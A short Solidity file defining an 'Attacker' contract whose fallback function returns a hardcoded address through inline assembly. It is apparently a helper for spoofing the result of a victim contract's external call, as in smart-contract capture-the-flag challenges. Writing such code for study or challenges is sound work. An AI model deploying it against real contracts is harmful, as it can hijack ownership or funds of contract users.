// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attacker {
    fallback() external payable {
        // Return our address as bytes32
        bytes32 value = bytes32(uint256(uint160(0x7979eFa67Dc53F3a86b26A83Dd72A05fd5F7c53d)));
        assembly {
            mstore(0, value)
            return(0, 0x20)
        }
    }
}